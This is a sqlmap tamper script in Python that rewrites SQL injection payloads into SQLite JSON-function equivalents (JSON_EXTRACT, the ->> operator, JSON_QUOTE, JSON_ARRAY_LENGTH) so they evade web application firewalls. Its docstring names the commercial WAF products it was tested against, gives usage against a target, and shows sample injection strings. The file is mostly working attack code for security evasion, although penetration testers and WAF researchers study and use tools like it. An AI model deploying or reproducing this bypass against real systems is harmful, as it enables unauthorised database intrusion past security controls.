#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

# Patterns breaks down SQLi payload into different components, and replaces the logical comparison.
pattern = r"(?i)(?P<pre>.*)\s*\b(?P<relation>AND|OR)\b\s*(?P<leftComponent>\(?\'.*?(?<!\\)(?:\'|\Z)\)?|\(?\".*?(?<!\\)(?:\"|\Z)\)?|\(?\d+(?!x[a-f0-9])\)?)(?P<operator>=|=|like)(?P<rightComponent>\(?\'.*?(?<!\\)(?:\'|\Z)\)?|\(?\".*?(?<!\\)(?:\"|\Z)\)?|\(?\d+(?!x[a-f0-9])\)?)(?P<post>.*)"
import re, random, string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST
DEBUG = False


def dependencies():
	pass


# Possible int payloads:
# 1) JSON_LENGTH()
# 2) json_depth
# 3) JSON_EXTRACT()
# 3) JSON_EXTRACT operator

def generate_int_payload():
	INT_FUNCTIONS = [generate_length_payload, generate_int_extract_payload, generate_int_extract_operator_payload]
	return (random.choice(INT_FUNCTIONS))()


# Possible STR payloads:
# 2) JSON_EXTRACT
# 2) JSON_EXTRACT Operator
# 3) JSON_QUOTE('null')

def generate_str_payload():
	STR_FUNCTIONS = [generate_str_extract_payload, generate_quote_payload, generate_str_extract_operator_payload]
	return (random.choice(STR_FUNCTIONS))()


def generate_random_string(length=15):
	str_length = random.randint(1, length)
	return "".join(random.choice(string.ascii_letters) for i in range(str_length))


def generate_random_int():
	return random.randint(2, 10000)


def generate_length_payload():
	rand_int = generate_random_int()
	return f"JSON_ARRAY_LENGTH(\"[]\") <= {generate_random_int()}"


def generate_quote_payload():
	var = generate_random_string()
	return f"JSON_QUOTE('{var}') = '\"{var}\"'"


def generate_int_extract_payload():
	return generate_extract_payload(isString=False)


def generate_str_extract_payload():
	return generate_extract_payload(isString=True)


def generate_int_extract_operator_payload():
	return generate_extract_operator_payload(isString=False)


def generate_str_extract_operator_payload():
	return generate_extract_operator_payload(isString=True)


def generate_extract_payload(isString=False):
	key = generate_random_string()
	if isString:
		value = generate_random_string()
		return f'JSON_EXTRACT(\'{{"{key}": "{value}"}}\', \'$.{key}\') = \'{value}\''
	value = generate_random_int()
	return f'JSON_EXTRACT("{{""{key}"": {value}}}", "$.{key}") = {value}'


def generate_extract_operator_payload(isString=False):

	key = generate_random_string()
	if isString:
		value = generate_random_string()
		return f'\'{{"{key}": "{value}"}}\'->> \'$.{key}\' = \'{value}\''
	value = generate_random_int()
	return f'"{{""{key}"": {value}}}" ->> "$.{key}" = {value}'


def generate_payload(isString, isBrackets):
	payload = '(' if isBrackets else ""
	if isString:
		payload += generate_str_payload()[:-1]  # Do not use the last ' because the application will add it.
	else:
		payload += generate_int_payload()

	return payload


def generate_random_payload():
	if random.randint(0, 1):
		return generate_str_payload()
	return generate_int_payload()


def tamper(payload, **kwargs):
	"""
        
    Bypasses generic WAFs using JSON SQL Syntax. 

    For more details about JSON in SQLite - https://www.sqlite.org/json1.html

    Tested against:
        * SQLite v3.39.4 - however every version after v3.38.0 should work

    Usage:
        python3 sqlmap.py <TARGET> --tamper json_waf_bypass_sqlite.py

    Notes:

    	* References: 
            * https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf 
            * https://www.blackhat.com/eu-22/briefings/schedule/#js-on-security-off-abusing-json-based-sql-queries-28774
        * Usefull for bypassing any JSON-unaware WAFs with minor-to-no adjusments
        * JSON techniques were tested againts the following WAF vendors:
            * Amazon AWS ELB
            * CloudFlare
            * F5 BIG-IP
            * Palo-Alto Next Generation Firewall
            * Imperva Firewall

        * This script alters the SQLi payload by replacing the condition statement with JSON-specific payloads,
          depending on the SQLi type. Here is a list of supported payload types: (int/string depends on the condition check type)

        Possible int payloads:
			1) JSON_LENGTH()
			2) json_depth
			3) JSON_EXTRACT()
			3) JSON_EXTRACT operator

        Possible STR payloads:
			2) JSON_EXTRACT
			2) JSON_EXTRACT Operator
			3) JSON_QUOTE('null')

    >>> tamper("' and 5626=9709 and 'kqkk'='kqkk")
    ''' ' and 5626=9709  and JSON_QUOTE('UG') = '"UG" '''
    >>> tamper('and 4515=8950')
    '''  and JSON_ARRAY_LENGTH("[]") <= 9100 '''
    """
	retVal = payload

	if payload:
		match = re.search(pattern, payload)

		if match:
			pre = match.group('pre')

			# Is our payload is a string.
			isString = pre.startswith("'")
			isBrackets = pre.startswith("')") or pre.startswith(")")
			wafPayload = generate_payload(isString=isString, isBrackets=isBrackets)
			retVal = f"{match.group('pre')} {match.group('relation')} {wafPayload}{match.group('post')}"

		else:

			if payload.lower().startswith("' union"):
				wafPayload = generate_random_payload()
				retVal = f"' and {wafPayload} {payload[1:]}"  # replace ' union select... with ' and FALSE_WAF_BYPASS union select...

	return retVal
